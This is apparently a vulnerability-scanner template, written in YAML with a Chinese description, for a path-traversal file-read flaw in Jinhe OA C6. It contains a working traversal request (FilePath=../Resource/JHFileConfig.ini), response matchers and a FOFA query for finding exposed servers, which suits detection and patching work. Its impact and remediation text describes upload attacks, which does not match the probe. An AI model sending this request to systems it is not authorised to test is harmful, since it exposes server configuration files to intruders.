id: jinhe-oa-c6-upload-lfi

info:
  name: Jinhe OA_C6_UploadFileDownLoadnew - 任意文件读取漏洞
  author: pussycat0x
  severity: high
  description: |
    该模板用于检测 Jinhe OA_C6_UploadFileDownLoadnew - 任意文件读取漏洞。该类漏洞通常源于上传接口缺少认证、文件类型校验、存储隔离或执行权限控制。模板会向 `/c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx/?FilePath=../Resource/JHFileConfig.ini` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可能上传脚本、WebShell 或恶意文件，并借此执行代码或长期控制服务器。
    - 上传目录若可被访问或解析，可能导致数据篡改、恶意内容投递和业务系统被接管。
  remediation: |
    - 为上传接口增加认证授权和 CSRF 防护，限制可上传文件类型、大小和扩展名。
    - 在服务端校验文件内容与 MIME 类型，将上传文件存储到不可执行目录并使用随机文件名。
    - 清理异常上传文件，复核上传目录解析配置、访问日志和可疑账号活动。
  reference:
    - https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COA_C6_UploadFileDownLoadnew%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  classification:
    cwe-id: CWE-23,CWE-73
  metadata:
    max-request: 1
    verified: true
    fofa-query: body="JHSoft.Web.AddMenu" || app="金和网络-金和OA"
  tags: jinhe-oa-c6,misconfig,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx/?FilePath=../Resource/JHFileConfig.ini"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "MaxFolderTotal=1"
          - "[JHFile]"
          - "FolderTotal=1"
        condition: and

      - type: status
        status:
          - 200
